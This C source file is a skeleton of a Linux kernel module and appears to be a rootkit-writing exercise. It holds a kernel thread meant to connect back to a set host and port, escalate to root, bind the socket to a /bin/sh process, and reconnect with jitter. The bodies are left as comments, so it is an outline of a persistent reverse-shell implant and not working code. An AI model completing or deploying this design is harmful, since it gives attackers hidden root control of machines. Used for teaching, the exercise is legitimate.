// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/cred.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/mutex.h>
#include <linux/random.h>
#include <linux/wait.h>
#include <net/sock.h>

static char *host = "10.0.2.2";
module_param(host, charp, 0400);

static int port = 4444;
module_param(port, int, 0400);

static unsigned long reconnect_delay_ms = 5000;
module_param(reconnect_delay_ms, ulong, 0400);

static struct task_struct *rk_thread;
static DECLARE_WAIT_QUEUE_HEAD(rk_wq);
static DEFINE_MUTEX(rk_shell_lock);
static bool rk_shell_busy;
static struct file *rk_sock_file;

static int rk_umh_init(struct subprocess_info *info, struct cred *new)
{
	int fd;
	int i;

	// Escalate to root and redirect fd 0, 1, 2 to the socket.

	return 0;
}

static int rk_try_connect(void)
{
	struct socket *sock;
	struct sockaddr_in addr;
	struct subprocess_info *umh_info;
	int error;

	char *argv[] = { "/bin/sh", NULL };
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	// Connect, convert socket to file, spawn shell, wait for it to exit.

	return 0;

out_file:
	fput(rk_sock_file);
	rk_sock_file = NULL;
	goto out_clear;

out_sock:
	sock_release(sock);

out_clear:
	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
	return error;
}

static int rk_agent_fn(void *data)
{
	unsigned long delay;
	unsigned long jitter_ms = 3000;

	// Loop: try_connect, sleep with jitter on failure, repeat.

	return 0;
}

static int __init rk_init(void)
{
	// Start the agent thread.
	return 0;
}

static void __exit rk_exit(void)
{
	// Stop the thread and clean up.
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
